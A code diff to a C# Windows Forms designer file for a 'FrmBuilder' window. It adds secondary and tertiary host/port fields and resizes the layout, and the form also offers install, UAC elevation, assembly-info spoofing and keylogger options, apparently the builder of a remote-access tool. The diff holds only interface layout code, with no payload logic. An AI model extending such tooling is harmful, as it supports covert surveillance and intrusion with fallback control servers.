@@ -31,15 +31,22 @@
             this.components = new System.ComponentModel.Container();
             System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FrmBuilder));
             this.groupConnection = new System.Windows.Forms.GroupBox();
+            this.lblTertiary = new System.Windows.Forms.Label();
+            this.txtPort3 = new System.Windows.Forms.TextBox();
+            this.txtHost3 = new System.Windows.Forms.TextBox();
+            this.lblSecondary = new System.Windows.Forms.Label();
+            this.txtPort2 = new System.Windows.Forms.TextBox();
+            this.txtHost2 = new System.Windows.Forms.TextBox();
+            this.lblPrimary = new System.Windows.Forms.Label();
             this.lblMS = new System.Windows.Forms.Label();
             this.txtDelay = new System.Windows.Forms.TextBox();
             this.lblDelay = new System.Windows.Forms.Label();
             this.chkShowPass = new System.Windows.Forms.CheckBox();
             this.txtPassword = new System.Windows.Forms.TextBox();
             this.lblPassword = new System.Windows.Forms.Label();
-            this.txtPort = new System.Windows.Forms.TextBox();
+            this.txtPort1 = new System.Windows.Forms.TextBox();
             this.lblPort = new System.Windows.Forms.Label();
-            this.txtHost = new System.Windows.Forms.TextBox();
+            this.txtHost1 = new System.Windows.Forms.TextBox();
             this.lblHost = new System.Windows.Forms.Label();
             this.groupInstall = new System.Windows.Forms.GroupBox();
             this.picUAC2 = new System.Windows.Forms.PictureBox();
@@ -97,47 +104,117 @@
             // 
             // groupConnection
             // 
+            this.groupConnection.Controls.Add(this.lblTertiary);
+            this.groupConnection.Controls.Add(this.txtPort3);
+            this.groupConnection.Controls.Add(this.txtHost3);
+            this.groupConnection.Controls.Add(this.lblSecondary);
+            this.groupConnection.Controls.Add(this.txtPort2);
+            this.groupConnection.Controls.Add(this.txtHost2);
+            this.groupConnection.Controls.Add(this.lblPrimary);
             this.groupConnection.Controls.Add(this.lblMS);
             this.groupConnection.Controls.Add(this.txtDelay);
             this.groupConnection.Controls.Add(this.lblDelay);
             this.groupConnection.Controls.Add(this.chkShowPass);
             this.groupConnection.Controls.Add(this.txtPassword);
             this.groupConnection.Controls.Add(this.lblPassword);
-            this.groupConnection.Controls.Add(this.txtPort);
+            this.groupConnection.Controls.Add(this.txtPort1);
             this.groupConnection.Controls.Add(this.lblPort);
-            this.groupConnection.Controls.Add(this.txtHost);
+            this.groupConnection.Controls.Add(this.txtHost1);
             this.groupConnection.Controls.Add(this.lblHost);
             this.groupConnection.Location = new System.Drawing.Point(12, 12);
             this.groupConnection.Name = "groupConnection";
-            this.groupConnection.Size = new System.Drawing.Size(325, 153);
+            this.groupConnection.Size = new System.Drawing.Size(432, 203);
             this.groupConnection.TabIndex = 0;
             this.groupConnection.TabStop = false;
             this.groupConnection.Text = "Connection";
             // 
+            // lblTertiary
+            //
+            this.lblTertiary.AutoSize = true;
+            this.lblTertiary.Location = new System.Drawing.Point(40, 96);
+            this.lblTertiary.Name = "lblTertiary";
+            this.lblTertiary.Size = new System.Drawing.Size(47, 13);
+            this.lblTertiary.TabIndex = 16;
+            this.lblTertiary.Text = "Tertiary:";
+            this.lblTertiary.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
+            //
+            // txtPort3
+            //
+            this.txtPort3.Location = new System.Drawing.Point(254, 90);
+            this.txtPort3.Name = "txtPort3";
+            this.txtPort3.Size = new System.Drawing.Size(169, 22);
+            this.txtPort3.TabIndex = 6;
+            this.txtPort3.TextChanged += new System.EventHandler(this.txtPort3_TextChanged);
+            //
+            // txtHost3
+            //
+            this.txtHost3.Location = new System.Drawing.Point(87, 90);
+            this.txtHost3.Name = "txtHost3";
+            this.txtHost3.Size = new System.Drawing.Size(161, 22);
+            this.txtHost3.TabIndex = 5;
+            this.txtHost3.TextChanged += new System.EventHandler(this.txtHost3_TextChanged);
+            //
+            // lblSecondary
+            //
+            this.lblSecondary.AutoSize = true;
+            this.lblSecondary.BackColor = System.Drawing.Color.Transparent;
+            this.lblSecondary.Location = new System.Drawing.Point(24, 65);
+            this.lblSecondary.Name = "lblSecondary";
+            this.lblSecondary.Size = new System.Drawing.Size(63, 13);
+            this.lblSecondary.TabIndex = 13;
+            this.lblSecondary.Text = "Secondary:";
+            this.lblSecondary.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
+            //
+            // txtPort2
+            //
+            this.txtPort2.Location = new System.Drawing.Point(254, 62);
+            this.txtPort2.Name = "txtPort2";
+            this.txtPort2.Size = new System.Drawing.Size(169, 22);
+            this.txtPort2.TabIndex = 4;
+            this.txtPort2.TextChanged += new System.EventHandler(this.txtPort2_TextChanged);
+            //
+            // txtHost2
+            //
+            this.txtHost2.Location = new System.Drawing.Point(87, 62);
+            this.txtHost2.Name = "txtHost2";
+            this.txtHost2.Size = new System.Drawing.Size(161, 22);
+            this.txtHost2.TabIndex = 3;
+            this.txtHost2.TextChanged += new System.EventHandler(this.txtHost2_TextChanged);
+            //
+            // lblPrimary
+            //
+            this.lblPrimary.AutoSize = true;
+            this.lblPrimary.Location = new System.Drawing.Point(40, 37);
+            this.lblPrimary.Name = "lblPrimary";
+            this.lblPrimary.Size = new System.Drawing.Size(47, 13);
+            this.lblPrimary.TabIndex = 10;
+            this.lblPrimary.Text = "Primary:";
+            this.lblPrimary.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
+            //
             // lblMS
-            // 
+            //
             this.lblMS.AutoSize = true;
-            this.lblMS.Location = new System.Drawing.Point(186, 126);
+            this.lblMS.Location = new System.Drawing.Point(186, 178);
             this.lblMS.Name = "lblMS";
-            this.lblMS.Size = new System.Drawing.Size(21, 13);
+            this.lblMS.Size = new System.Drawing.Size(49, 13);
             this.lblMS.TabIndex = 9;
             this.lblMS.Text = "ms";
-            // 
+            //
             // txtDelay
-            // 
-            this.txtDelay.Location = new System.Drawing.Point(118, 120);
+            //
+            this.txtDelay.Location = new System.Drawing.Point(118, 172);
             this.txtDelay.MaxLength = 6;
             this.txtDelay.Name = "txtDelay";
             this.txtDelay.Size = new System.Drawing.Size(66, 22);
-            this.txtDelay.TabIndex = 8;
+            this.txtDelay.TabIndex = 9;
             this.txtDelay.Text = "5000";
             this.txtDelay.TextChanged += new System.EventHandler(this.txtDelay_TextChanged);
             this.txtDelay.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.txtDelay_KeyPress);
-            // 
+            //
             // lblDelay
-            // 
+            //
             this.lblDelay.AutoSize = true;
-            this.lblDelay.Location = new System.Drawing.Point(17, 123);
+            this.lblDelay.Location = new System.Drawing.Point(17, 175);
             this.lblDelay.Name = "lblDelay";
             this.lblDelay.Size = new System.Drawing.Size(95, 13);
             this.lblDelay.TabIndex = 7;
@@ -146,61 +223,61 @@
             // chkShowPass
             // 
             this.chkShowPass.AutoSize = true;
-            this.chkShowPass.Location = new System.Drawing.Point(118, 99);
+            this.chkShowPass.Location = new System.Drawing.Point(118, 151);
             this.chkShowPass.Name = "chkShowPass";
             this.chkShowPass.Size = new System.Drawing.Size(107, 17);
-            this.chkShowPass.TabIndex = 6;
+            this.chkShowPass.TabIndex = 8;
             this.chkShowPass.Text = "Show Password";
             this.chkShowPass.UseVisualStyleBackColor = true;
             this.chkShowPass.CheckedChanged += new System.EventHandler(this.chkShowPass_CheckedChanged);
             // 
             // txtPassword
             // 
-            this.txtPassword.Location = new System.Drawing.Point(118, 71);
+            this.txtPassword.Location = new System.Drawing.Point(118, 123);
             this.txtPassword.Name = "txtPassword";
             this.txtPassword.PasswordChar = '•';
             this.txtPassword.Size = new System.Drawing.Size(201, 22);
-            this.txtPassword.TabIndex = 5;
+            this.txtPassword.TabIndex = 7;
             this.txtPassword.TextChanged += new System.EventHandler(this.txtPassword_TextChanged);
             // 
             // lblPassword
             // 
             this.lblPassword.AutoSize = true;
-            this.lblPassword.Location = new System.Drawing.Point(53, 74);
+            this.lblPassword.Location = new System.Drawing.Point(53, 126);
             this.lblPassword.Name = "lblPassword";
             this.lblPassword.Size = new System.Drawing.Size(59, 13);
             this.lblPassword.TabIndex = 4;
             this.lblPassword.Text = "Password:";
             // 
-            // txtPort
+            // txtPort1
             // 
-            this.txtPort.Location = new System.Drawing.Point(118, 43);
-            this.txtPort.Name = "txtPort";
-            this.txtPort.Size = new System.Drawing.Size(201, 22);
-            this.txtPort.TabIndex = 3;
-            this.txtPort.TextChanged += new System.EventHandler(this.txtPort_TextChanged);
+            this.txtPort1.Location = new System.Drawing.Point(254, 34);
+            this.txtPort1.Name = "txtPort1";
+            this.txtPort1.Size = new System.Drawing.Size(169, 22);
+            this.txtPort1.TabIndex = 2;
+            this.txtPort1.TextChanged += new System.EventHandler(this.txtPort1_TextChanged);
             // 
             // lblPort
             // 
             this.lblPort.AutoSize = true;
-            this.lblPort.Location = new System.Drawing.Point(81, 46);
+            this.lblPort.Location = new System.Drawing.Point(255, 18);
             this.lblPort.Name = "lblPort";
             this.lblPort.Size = new System.Drawing.Size(31, 13);
             this.lblPort.TabIndex = 2;
             this.lblPort.Text = "Port:";
             // 
-            // txtHost
+            // txtHost1
             // 
-            this.txtHost.Location = new System.Drawing.Point(118, 15);
-            this.txtHost.Name = "txtHost";
-            this.txtHost.Size = new System.Drawing.Size(201, 22);
-            this.txtHost.TabIndex = 1;
-            this.txtHost.TextChanged += new System.EventHandler(this.txtHost_TextChanged);
+            this.txtHost1.Location = new System.Drawing.Point(87, 34);
+            this.txtHost1.Name = "txtHost1";
+            this.txtHost1.Size = new System.Drawing.Size(161, 22);
+            this.txtHost1.TabIndex = 1;
+            this.txtHost1.TextChanged += new System.EventHandler(this.txtHost1_TextChanged);
             // 
             // lblHost
             // 
             this.lblHost.AutoSize = true;
-            this.lblHost.Location = new System.Drawing.Point(37, 18);
+            this.lblHost.Location = new System.Drawing.Point(88, 17);
             this.lblHost.Name = "lblHost";
             this.lblHost.Size = new System.Drawing.Size(75, 13);
             this.lblHost.TabIndex = 0;
@@ -229,9 +306,9 @@
             this.groupInstall.Controls.Add(this.txtInstallname);
             this.groupInstall.Controls.Add(this.lblInstallname);
             this.groupInstall.Controls.Add(this.chkInstall);
-            this.groupInstall.Location = new System.Drawing.Point(12, 171);
+            this.groupInstall.Location = new System.Drawing.Point(12, 221);
             this.groupInstall.Name = "groupInstall";
-            this.groupInstall.Size = new System.Drawing.Size(325, 310);
+            this.groupInstall.Size = new System.Drawing.Size(432, 310);
             this.groupInstall.TabIndex = 1;
             this.groupInstall.TabStop = false;
             this.groupInstall.Text = "Install";
@@ -473,7 +550,7 @@
             // 
             // btnBuild
             // 
-            this.btnBuild.Location = new System.Drawing.Point(540, 458);
+            this.btnBuild.Location = new System.Drawing.Point(647, 458);
             this.btnBuild.Name = "btnBuild";
             this.btnBuild.Size = new System.Drawing.Size(121, 23);
             this.btnBuild.TabIndex = 4;
@@ -500,7 +577,7 @@
             this.groupAsmInfo.Controls.Add(this.lblDescription);
             this.groupAsmInfo.Controls.Add(this.txtProductName);
             this.groupAsmInfo.Controls.Add(this.lblProductName);
-            this.groupAsmInfo.Location = new System.Drawing.Point(343, 12);
+            this.groupAsmInfo.Location = new System.Drawing.Point(450, 12);
             this.groupAsmInfo.Name = "groupAsmInfo";
             this.groupAsmInfo.Size = new System.Drawing.Size(317, 269);
             this.groupAsmInfo.TabIndex = 2;
@@ -659,7 +736,7 @@
             this.groupAdditional.Controls.Add(this.chkKeylogger);
             this.groupAdditional.Controls.Add(this.chkIconChange);
             this.groupAdditional.Controls.Add(this.chkElevation);
-            this.groupAdditional.Location = new System.Drawing.Point(343, 287);
+            this.groupAdditional.Location = new System.Drawing.Point(450, 287);
             this.groupAdditional.Name = "groupAdditional";
             this.groupAdditional.Size = new System.Drawing.Size(318, 153);
             this.groupAdditional.TabIndex = 3;
@@ -682,7 +759,7 @@
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
             this.BackColor = System.Drawing.Color.White;
-            this.ClientSize = new System.Drawing.Size(673, 499);
+            this.ClientSize = new System.Drawing.Size(776, 539);
             this.Controls.Add(this.groupAdditional);
             this.Controls.Add(this.groupAsmInfo);
             this.Controls.Add(this.btnBuild);
@@ -718,9 +795,9 @@
         private System.Windows.Forms.CheckBox chkShowPass;
         private System.Windows.Forms.TextBox txtPassword;
         private System.Windows.Forms.Label lblPassword;
-        private System.Windows.Forms.TextBox txtPort;
+        private System.Windows.Forms.TextBox txtPort1;
         private System.Windows.Forms.Label lblPort;
-        private System.Windows.Forms.TextBox txtHost;
+        private System.Windows.Forms.TextBox txtHost1;
         private System.Windows.Forms.Label lblHost;
         private System.Windows.Forms.TextBox txtDelay;
         private System.Windows.Forms.Label lblDelay;
@@ -771,5 +848,12 @@
         private System.Windows.Forms.CheckBox chkChangeAsmInfo;
         private System.Windows.Forms.GroupBox groupAdditional;
         private System.Windows.Forms.CheckBox chkKeylogger;
+        private System.Windows.Forms.Label lblPrimary;
+        private System.Windows.Forms.Label lblSecondary;
+        private System.Windows.Forms.TextBox txtPort2;
+        private System.Windows.Forms.TextBox txtHost2;
+        private System.Windows.Forms.Label lblTertiary;
+        private System.Windows.Forms.TextBox txtPort3;
+        private System.Windows.Forms.TextBox txtHost3;
     }
 }
